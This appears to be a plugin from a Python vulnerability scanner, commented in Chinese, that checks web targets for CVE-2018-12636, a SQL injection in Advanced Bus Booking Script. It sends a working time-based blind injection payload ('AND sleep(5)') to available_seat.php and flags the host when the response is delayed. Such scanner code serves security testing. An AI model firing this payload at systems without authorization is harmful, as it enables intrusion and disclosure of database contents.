#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
import requests
import ClassCongregation
import time
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2018-12636" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['createDate'] = "2020-1-19"  # 插件编辑时间
        self.info['disclosure']='2017-03-23'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "AdvancedBusBookingScriptSQLInjection"  # 插件名称
        self.info['name'] ='AdvancedBusBooking脚本SQL注入' #漏洞名称
        self.info['affects'] = "BusBookingScript"  # 漏洞组件
        self.info['desc_content'] = "AdvancedBusBooking脚本存在SQL注入漏洞，允许攻击者利用漏洞获取数据库敏感信息。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "AdvancedBusBookingScript2.04"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload1 = "/available_seat.php?hid_Busid=2"
        payload2 = "/available_seat.php?hid_Busid=2 AND sleep(5)"
        payload_url1 = scheme + "://" + url +":"+ str(port)+ payload1
        payload_url2 = scheme + "://" + url + ":" + str(port) + payload2

        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        start_time = time.time()
        resp = requests.get(payload_url1,headers=headers, timeout=6, verify=False)
        end_time_1 = time.time()
        resp2 = requests.get(payload_url2, headers=headers, timeout=6, verify=False)
        end_time_2 = time.time()
        delta1 = end_time_1 - start_time
        delta2 = end_time_2 - end_time_1
        con = resp2.text
        if (delta2 - delta1) > 4:
            Medusa = "{}存在AdvancedBusBooking脚本SQL注入漏洞\r\n 验证数据:\r\nUrl:{}\r\n返回内容:{}\r\n".format(url,payload_url2,con)
            _t=VulnerabilityInfo(Medusa)
            web=ClassCongregation.VulnerabilityDetails(_t.info)
            web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名